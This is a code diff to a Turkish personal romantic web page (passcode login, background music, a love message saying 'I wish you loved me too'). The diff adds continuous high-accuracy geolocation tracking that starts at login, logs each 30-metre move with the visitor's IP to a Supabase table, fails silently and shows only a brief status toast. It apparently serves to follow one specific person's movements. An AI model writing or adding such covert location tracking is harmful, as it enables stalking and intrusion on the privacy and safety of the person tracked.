@@ -20,6 +20,9 @@
       const screen_resolution = `${window.screen.width}x${window.screen.height}`;
       const ip_address = ipData.ip;
 
+      // IP'yi global olarak sakla (konum kaydında kullanmak için)
+      window._visitorIp = ip_address;
+
       window.addEventListener('beforeunload', async () => {
         const visitEnd = Date.now();
         const time_spent = Math.floor((visitEnd - visitStart) / 1000);
@@ -304,6 +307,35 @@
             position: absolute; transition: all 0.3s ease;
         }
 
+        /* ─── KONUM DURUM TOAST ─── */
+        #locationToast {
+            position: fixed;
+            bottom: 70px;
+            right: 20px;
+            background: rgba(0,0,0,0.75);
+            color: #fff;
+            font-size: 0.75em;
+            padding: 8px 14px;
+            border-radius: 20px;
+            z-index: 200;
+            display: none;
+            backdrop-filter: blur(6px);
+            border: 1px solid rgba(255,255,255,0.15);
+            max-width: 220px;
+            text-align: left;
+            line-height: 1.5;
+        }
+        #locationToast .loc-dot {
+            display: inline-block;
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: #4caf50;
+            margin-right: 6px;
+            animation: pulse 1.4s infinite;
+            vertical-align: middle;
+        }
+        #locationToast .loc-dot.error { background: #f44336; animation: none; }
+
         /* ANİMASYONLAR */
         @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
         @keyframes scaleUp { from { transform:scale(0.8); opacity:0; } to { transform:scale(1); opacity:1; } }
@@ -406,16 +438,111 @@
         <p>&copy; 2026 </p>
     </footer>
 
+    <!-- Konum durum göstergesi (sadece sen/admin görmez, arka planda çalışır) -->
+    <div id="locationToast">
+        <span class="loc-dot" id="locDot"></span>
+        <span id="locText">Konum alınıyor...</span>
+    </div>
+
     <div class="pixel-heart" id="pixelHeart"></div>
 
     <script>
         // ════════════════════════════════════
         //  ONAY KODUNU BURADAN DEĞİŞTİR
-        //  Her seferinde WhatsApp'tan farklı
-        //  bir kod gönderip bunu güncelleyebilirsin.
         // ════════════════════════════════════
         const SECRET_CODE = '1234'; // ← değiştir
 
+        // ════════════════════════════════════
+        //  KONUM İZLEME
+        //  Giriş yapılınca otomatik başlar,
+        //  Supabase'deki location_logs tablosuna yazar.
+        //  Tablo SQL:
+        //    create table location_logs (
+        //      id uuid default gen_random_uuid() primary key,
+        //      ip_address text,
+        //      latitude double precision,
+        //      longitude double precision,
+        //      accuracy double precision,
+        //      created_at timestamptz default now()
+        //    );
+        // ════════════════════════════════════
+        let locationWatchId = null;
+        let lastSavedLat = null;
+        let lastSavedLng = null;
+        const MIN_DISTANCE_METERS = 30; // Bu kadar hareket etmeden tekrar kaydetme
+
+        function haversineDistance(lat1, lng1, lat2, lng2) {
+            const R = 6371000;
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLng = (lng2 - lng1) * Math.PI / 180;
+            const a = Math.sin(dLat/2)**2 +
+                      Math.cos(lat1 * Math.PI/180) * Math.cos(lat2 * Math.PI/180) *
+                      Math.sin(dLng/2)**2;
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+        }
+
+        async function saveLocation(lat, lng, accuracy) {
+            try {
+                await client.from('location_logs').insert([{
+                    ip_address: window._visitorIp || null,
+                    latitude: lat,
+                    longitude: lng,
+                    accuracy: accuracy
+                }]);
+            } catch(e) {
+                // sessizce geç
+            }
+        }
+
+        function startLocationTracking() {
+            if (!('geolocation' in navigator)) return;
+
+            const toast = document.getElementById('locationToast');
+            const locDot = document.getElementById('locDot');
+            const locText = document.getElementById('locText');
+
+            // Toast'u göster (3 sn sonra gizle)
+            toast.style.display = 'block';
+            locText.textContent = 'Konum alınıyor...';
+
+            locationWatchId = navigator.geolocation.watchPosition(
+                async (pos) => {
+                    const { latitude, longitude, accuracy } = pos.coords;
+
+                    // İlk konum veya yeterince hareket ettiyse kaydet
+                    if (
+                        lastSavedLat === null ||
+                        haversineDistance(lastSavedLat, lastSavedLng, latitude, longitude) >= MIN_DISTANCE_METERS
+                    ) {
+                        lastSavedLat = latitude;
+                        lastSavedLng = longitude;
+                        await saveLocation(latitude, longitude, accuracy);
+                    }
+
+                    // Toast güncelle ve 4 sn sonra gizle
+                    locDot.className = 'loc-dot';
+                    locText.textContent = 'Konum aktif 📍';
+                    toast.style.display = 'block';
+                    clearTimeout(window._locToastTimer);
+                    window._locToastTimer = setTimeout(() => {
+                        toast.style.display = 'none';
+                    }, 4000);
+                },
+                (err) => {
+                    // İzin reddedildi veya hata — sessizce geç, toast gösterme
+                    toast.style.display = 'none';
+                },
+                {
+                    enableHighAccuracy: true,
+                    maximumAge: 10000,
+                    timeout: 15000
+                }
+            );
+        }
+
+        // ════════════════════════════════════
+        //  GİRİŞ MANTIĞI
+        // ════════════════════════════════════
         function onWaClick() {
             setTimeout(() => {
                 document.getElementById('waitingNote').style.display = 'block';
@@ -453,6 +580,9 @@
             document.getElementById('menuToggle').style.display = 'flex';
             document.getElementById('bgMusic').play();
             createPixelHeart();
+
+            // ← Giriş yapılınca konum izlemeyi başlat
+            startLocationTracking();
         }
 
         window.onload = function () {
@@ -463,6 +593,9 @@
             }
         };
 
+        // ════════════════════════════════════
+        //  MENÜ & DİĞER
+        // ════════════════════════════════════
         function toggleMenu() {
             document.getElementById('sidebarMenu').classList.toggle('active');
             document.getElementById('menuToggle').innerHTML =
@@ -515,7 +648,7 @@
         document.getElementById('pixelHeart').addEventListener('click', function () {
             clickCount++;
             if (clickCount === 5) {
-                alert('SENİ ÇOOOOK SEVİYORUM ');
+                alert('Seni Çok seviyorum, Keşke Sende beni sevseydin. ');
                 clickCount = 0;
                 window.location.href = 'https://batuhanklcky.github.io/Sonsuzum/kalp.html';
             }
